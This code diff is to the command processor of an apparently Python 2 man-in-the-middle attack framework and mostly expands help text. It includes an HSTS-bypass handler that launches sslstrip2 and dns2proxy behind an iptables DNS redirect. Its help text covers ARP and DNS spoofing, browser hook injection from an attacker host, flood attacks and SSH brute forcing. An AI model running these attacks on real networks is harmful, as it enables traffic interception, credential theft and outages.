@@ -94,17 +94,7 @@ class Processor(object):
 						print_help()
 
 						# HSTSBYPASS
-					elif self.input_list[0] == "hstsbypass":
-						if self.input_list[1] == "help":
-							print "\n[Help] Start to perform a HSTS Bypass with dns2proxy and SSL strip with sslstrip+"
-							print "[Required] ARP spoofing started."
-							print "example:" 
-							print "{} set interface wlan0".format(console)
-							print "{} set gateway 10.0.0.1".format(console)
-							print "{} set target 10.0.0.5".format(console)
-							print "{} arpspoof start".format(console)
-							print "{} hstsbypass\n".format(console)
-							continue
+					elif self.command == "hstsbypass":
 
 						if self.arpspoof_status:
 							print "[*] SSLstrip+ initialized"
@@ -118,15 +108,26 @@ class Processor(object):
 								#iptables redirect traffic to port that dns2proxy are listening
 							os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
 
-								#Start subprocess with shell=True with sslstrip2 and dns2proxy
-			                        	with open("log/sslstrip.log", "a+") as stdout:
-                                				self.p1 = subprocess.Popen(["python sslstrip2/sslstrip.py -l 8000","sslstrip"], shell=True, stdout=stdout, stderr=stdout)
+							#Start subprocess with shell=True with sslstrip2 and dns2proxy
+				               	       	with open("log/sslstrip.log", "a+") as stdout:
+        	                       				self.p1 = subprocess.Popen(["python sslstrip2/sslstrip.py -l 8000","sslstrip"], shell=True, stdout=stdout, stderr=stdout)
 								self.sslstrip_status = True
 							with open("log/dns2proxy.log","a+") as stdout:
 								self.p2 = subprocess.Popen(["python dns2proxy/dns2proxy.py","dns2proxy"], shell=True, stdout=stdout, stderr=stdout)
 								self.dns2proxy_status = True
 						else:
 							print "[!] You need to start an ARP spoof attack first."
+
+
+
+					elif self.command == "hstsbypass help":
+						print "\n[Help] Start to perform a HSTS Bypass with dns2proxy and SSL strip with sslstrip+"
+						print "[Required] ARP spoofing started."
+						print "example:"
+						print "{} hstsbypass\n".format(console)
+
+
+
 
 					elif self.command == "jarvis":
 						self.Jarvis.start('core/processor.py')
@@ -206,7 +207,7 @@ class Processor(object):
 							print "[*] DNS2Proxy finalized."
 						exit()
 
-					
+
 					elif self.input_list[0] == "set" or self.input_list[0] == "SET":
 						if self.input_list[1] == "interface":
 							try:
@@ -297,6 +298,16 @@ class Processor(object):
 
 						elif self.input_list[1] == "help":
 							print "\n[Help] Select a variable to set."
+							print "parameters:"
+							print " - interface"
+							print " - gateway"
+							print " - target"
+							print " - file"
+							print " - arpmode"
+							print " - domain"
+							print " - redirect"
+							print " - script"
+							print " - filter"
 							print "example:"
 							print "{} set interface\n".format(console)
 
@@ -334,6 +345,10 @@ class Processor(object):
 						if self.input_list[1] == "help":
 							print "\n[Help] Start a scanner in target host."
 							print "[Required] interface and target"
+							print "parameters:"
+							print " - tcp"
+							print " - arp"
+							print " - manual"
 							print "example:"
 							print "{} set target www.google.com".format(console)
 							print "{} set interface eth0".format(console)
@@ -393,6 +408,10 @@ class Processor(object):
 							elif self.input_list[1] == "help":
 								print "\n[Help] Start a ARP spoofing attack."
 								print "[Optional] set arpmode with rep to spoof with responses and req to spoof with requests"
+								print "parameters:"
+								print " - start"
+								print " - stop"
+								print " - status"
 								print "example:"
 								print "{} set interface eth0".format(console)
 								print "{} set gateway 192.168.0.1".format(console)
@@ -457,6 +476,10 @@ class Processor(object):
 							elif self.input_list[1] == "help":
 								print "\n[Help] Start to DNS spoof."
 								print "[Required] ARP spoof started."
+								print "parameters:"
+								print " - start"
+								print " - stop"
+								print " - status"
 								print "example:"
 								print "{} dnsspoof start".format(console)
 								print "[!] Type all to spoof all domains"
@@ -502,6 +525,10 @@ class Processor(object):
 							elif self.input_list[1] == "help":
 								print "\n[Help] Start to inject a source script into target browser."
 								print "[Required] ARP spoof started."
+								print "parameters:"
+								print " - start"
+								print " - stop"
+								print " - status"
 								print "example:"
 								print "{} inject start".format(console)
   								print "[+] Enter the script source: http://192.168.1.6:3000/hook.js\n"
@@ -526,6 +553,7 @@ class Processor(object):
 									print "[Required] ARP spoof started"
 									print "example:"
 									print "{} dos dnsdrop\n".format(console) 
+									continue
 
 								if self.arpspoof_status:
 									try:
@@ -546,6 +574,7 @@ class Processor(object):
 									print "{} set target 192.168.1.4".format(console)
 									print "{} set interface wlan0".format(console)
 									print "{} dos synflood\n".format(console) 
+									continue
 
 								if self.targets == None:
 									print "[!] You probably forgot to set a IP address as target."
@@ -568,6 +597,7 @@ class Processor(object):
 									print "{} set target 192.168.1.4".format(console)
 									print "{} set interface wlan0".format(console)
 									print "{} dos synflood\n".format(console) 
+									continue
 
 								if self.targets == None:
 									print "[!] You probably forgot to set a IP address as target."
@@ -613,6 +643,11 @@ class Processor(object):
 							elif self.input_list[1] == "help":
 								print "\n[Help] Start to perform a choosen denial of service in target."
 								print "[Required] Depends"
+								print "parameters:"
+								print " - dnsdrop"
+								print " - synflood"
+								print " - udpflood"
+								print " - icmpsmurf"
 								print "example:"
 								print "{} dos icmpsmurf help\n".format(console)
 
@@ -687,6 +722,9 @@ class Processor(object):
 						if self.input_list[1] == "help":
 							print "\n[Help] Interactive stdin or tcp exploit development shell."
 							print "[Required] File as target to stdin and IP address as target to tcp"
+							print "parameters:"
+							print " - tcp"
+							print " - stdin"
 							print "example:"
 							print "{} set target 192.168.1.1".format(console)
 							print "{} xploit tcp\n".format(console)
@@ -784,8 +822,13 @@ class Processor(object):
 							if self.input_list[1] == "help":
 								print "\n[Help] Interactive stdin or tcp exploit development shell."
 								print "[Required] File as password wordlist and target as URL or IP."
+								print "parameters:"
+								print " - ssh"
+								print " - form"
+								print " - url"
 								print "example:"
 								print "{} brute ssh help\n".format(console)
+								continue
 
 							if self.input_list[1] == "ssh":
 
